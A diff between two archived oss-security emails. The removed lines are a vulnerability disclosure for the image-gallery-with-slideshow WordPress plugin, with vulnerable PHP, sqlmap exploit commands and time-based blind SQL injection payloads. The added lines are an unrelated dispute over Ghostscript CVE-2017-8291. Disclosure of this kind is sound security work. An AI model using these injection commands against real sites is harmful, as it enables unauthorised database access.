@@ -1,136 +1,65 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/04/05/1
-Message-id: <27FD4B62-8D1D-449B-A3F6-3CE6780A3E2B@me.com>
-Date: Wed, 05 Apr 2017 19:00:03 -0400
-From: "Larry W. Cashdollar" <larry0@...com>
-To: Open Source Security <oss-security@...ts.openwall.com>
-Subject: Blind SQL Injection and persistent XSS in Wordpress plugin image-gallery-with-slideshow v1.5.2
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/04/29/3
+Message-ID: <CAPGxrc_yrmXsGOs_nRLJoqP=sTPRnjsnxL=ts=E5Vj-UxT_VhQ@mail.gmail.com>
+Date: Sat, 29 Apr 2017 19:24:09 +0800
+From: redrain root <rootredrain@...il.com>
+To: oss-security@...ts.openwall.com
+Subject: Re: CVE-2017-8291 ghostscript remote code execution
 Content-Type: text/plain; charset=utf-8
 
-Title: Blind SQL Injection and persistent XSS in Wordpress plugin image-gallery-with-slideshow v1.5.2
-Author: Larry W. Cashdollar, @_larry0
-Date: 2017-04-01
-CVE-ID:[CVE-2017-1002011][CVE-2017-1002012][CVE-2017-1002013][CVE-2017-1002014][CVE-2017-1002015]
-Download Site: https://wordpress.org/plugins/image-gallery-with-slideshow/
-Vendor: http://www.anblik.com/
-Vendor Notified: 2017-04-01
-Vendor Contact: https://twitter.com/anblik
-Advisory: http://www.vapidlabs.com/advisory.php?v=189
-Description: Image Gallery with Slideshow is a full integrated Image Gallery and Slideshow plugin for WordPress.
-Vulnerability:
-CVE-2017-1002011:
+nope~
+I know this issue is a type confusion similar to your initialized dsc
+parser
+for example
+The last previous vulnerability code exists in the
+zinitialize_dsc_parser(). The method gets the memory data using
+dict_memory() and treats it as an object to call its gs_alloc_struct()
+method.
+in the Evince code execution demo,  uses ghostscript (libgs.so) as the .ps
+file processor
+and another demo attack imagick is the shell command injection vuln.
 
-There is a stored XSS vulnerability via the $value->gallery_name and $value->gallery_description where anyone with privileges to modify or add galleries / images and inject javascript into the database.
+and CVE-2017-8291 is a part of my exploit last year it also affect some
+programs use ghostscript
+that's why I use Evince as the example.
 
-145  <td><a class="row-title" title="Edit" href="<?php echo bloginfo('url');?>/wp-admin/admin.php?page=gallery_with_slideshow&val=view&gid=<?php echo $value->gallery_id;?>"><?php echo $value->gallery_name;?></a></td>
-146  <td>&nbsp;<?php echo $value->gallery_description;?></td>
-
-CVE-2017-1002012:
-
-In image-gallery-with-slideshow/admin_setting.php the following snippet of code does not sanitize input via the gid variable before passing it into an SQL statement:
+Regards,
+redrain
 
 
-173 if($_REQUEST['val'] == 'view')
-174 {
-175         $path_value = get_combo_path_value();
-176         $id = $_REQUEST['gid'];
-177         global $wpdb;
-178         $table_prefix = $wpdb->prefix;
-179         $result = $wpdb->get_results("SELECT ig.gallery_name,ii.image_id,ii.original_name,ii.image_name,ii.gallery_id,ii.image_title,ii.link_url,ii.image_description FROM `".$table_prefix."combo_gallery` AS ig,`".$table_prefix."combo_image` AS ii WHERE ig.gallery_   id=ii.gallery_id AND ii.gallery_id =".$id);
 
+2017-04-29 13:36 GMT+08:00 Tavis Ormandy <taviso@...gle.com>:
 
-255 if($_REQUEST['val'] == 'edit')
-256 {
-257         $id = $_REQUEST['gid'];
-258         global $wpdb;
-259         $table_prefix = $wpdb->prefix;
-.
-.
-.
-270         $edit_result = $wpdb->get_results("SELECT * FROM `".$table_prefix."combo_gallery` WHERE gallery_id = ".$id);
+> On Fri, Apr 28, 2017 at 7:43 PM, redrain root <rootredrain@...il.com>
+> wrote:
+> >
+> > what a awkward??
+> > I have discovered a part of my vulns about ghostscript last year and
+> > exploited in fulldisclosure early!
+> > and these vulns are part of mine I was going to discovered these in
+> defcon
+> > or other conference...WTF...
+> > u guys are logo designer???
+> >
+> > there are two demos last year
+> > Evince Arbitrary Code Execution https://youtu.be/wzcrHXngfcM Attack
+> Imagick
+> > through Ghostscript https://youtu.be/tPGm_ANDyOw
+> >
+>
+> I don't think so, that is CVE-2016-7976 and is entirely unrelated to
+> the issue being discussed, other than superficial similarity of the
+> exploit.
+>
+> That issue was reported by me, and we discussed the ImageMagick and
+> evince attack vectors at the time, you can check the archives if
+> you're interested.
+>
+> http://seclists.org/oss-sec/2016/q4/29
+>
+> This issue (CVE-2017-8291) is a type confusion vulnerability (well,
+> technically two vulnerabilities), and was found in the wild.
+>
+> Tavis.
+>
 
-CVE-2017-1002013:
-Blind SQL Injection via imgid parameter.
-
-301 if($_REQUEST['val'] == 'imgedit')
-302 {
-303         $id = $_REQUEST['imgid'];
-304         $gid = $_REQUEST['gid'];
-305         global $wpdb;
-.
-.
-309         if(isset($_REQUEST['edit_image_submit']))
-310         {
-.
-.
-.
-318         $edit_img_result = $wpdb->get_results("SELECT * FROM `".$table_prefix."combo_image` WHERE image_id = ".$id);
-
-
-361 if($_REQUEST['gval'] == 'delete')
-362 {
-363         $id = $_REQUEST['gid'];
-364         global $wpdb;
-365         $table_prefix = $wpdb->prefix;
-366         $info = $_SERVER['DOCUMENT_ROOT'];
-367         $path_value = get_combo_path_value();
-368         $select_img_query_result = $wpdb->get_results("SELECT * FROM `".$table_prefix."combo_image` WHERE gallery_id=".$id);
-
-
-384 if($_REQUEST['ival'] == 'delete')
-385 {
-386         $path_value = get_combo_path_value();
-387         $id = $_REQUEST['gid'];
-388         global $wpdb;
-389         $table_prefix = $wpdb->prefix;
-390         $info = $_SERVER['DOCUMENT_ROOT'];
-391         $select_img_query_result1 = $wpdb->get_results("SELECT * FROM `".$table_prefix."combo_image` WHERE image_id=".$id);
-
-CVE-2017-1002014:
-Blind SQL Injection via gallery_name parameter.
-
-422 if(isset($_POST['gallery_submit']))
-423 {
-424         $gallery_name = $_REQUEST['gallery_name'];
-425         $insert_query_result = $wpdb->insert($table_prefix.'combo_gallery', array('gallery_name' => $gallery_name,'date' => current_time('mysql')));
-426 
-
-CVE-2017-1002015:
-Blind SQL Injection via selectMulGallery parameter.
-492 if(isset($_POST['image_submit']))
-493 {
-494         $gallery_id = $_POST['selectMulGallery'];
-495         $update_gallery_query = "UPDATE `".$table_prefix."combo_image` SET gallery_id=".$gallery_id." WHERE gallery_id = '0'";
-496         $wpdb->query($update_gallery_query);
-
-Exploit Code:
-	• $ sqlmap -u 'http://example.com/wordpress/wp-admin/admin.php?page=gallery_with_slideshow&val=view&gid=*' --load-cookies=./cookie.txt --dbms=mysql --risk 2 --level 2
-	•  
-	•  
-	• Parameter: #1* (URI)
-	•     Type: AND/OR time-based blind
-	•     Title: MySQL >= 5.0.12 time-based blind - Parameter replace
-	•     Payload: http://192.168.0.169:80/wordpress/wp-admin/admin.php?page=gallery_with_slideshow&val=view&gid=(CASE WHEN (2912=2912) THEN SLEEP(5) ELSE 2912 END)
-	• ---
-	• [14:28:20] [INFO] the back-end DBMS is MySQL
-	• web server operating system: Linux Ubuntu 16.04 (xenial)
-	• web application technology: Apache 2.4.18
-	• back-end DBMS: MySQL >= 5.0.12
-	• [14:28:20] [INFO] fetched data logged to text files under '/home/larry/.sqlmap/output/example.com'
-	•  
-	• [*] shutting down at 14:28:20
-	•  
-	•  
-	• $ sqlmap -u 'http://192.168.0.169/wordpress/wp-admin/admin.php?page=gallery_with_slideshow&val=imgedit&imgid=*&gid=1' --load-cookies=./cookie.txt --dbms=mysql --risk 2 --level 2
-	• sqlmap identified the following injection point(s) with a total of 337 HTTP(s) requests:
-	• ---
-	• Parameter: #1* (URI)
-	•     Type: AND/OR time-based blind
-	•     Title: MySQL >= 5.0.12 time-based blind - Parameter replace
-	•     Payload: http://example.com:80/wordpress/wp-admin/admin.php?page=gallery_with_slideshow&val=imgedit&imgid=(CASE WHEN (4482=4482) THEN SLEEP(5) ELSE 4482 END)&gid=1
-	• ---
-	• [22:07:00] [INFO] the back-end DBMS is MySQL
-	• web server operating system: Linux Ubuntu 16.04 (xenial)
-	• web application technology: Apache 2.4.18
-	• back-end DBMS: MySQL >= 5.0.12
-	• [22:07:00] [INFO] fetched data logged to text files under '/home/larry/.sqlmap/output/example.com'
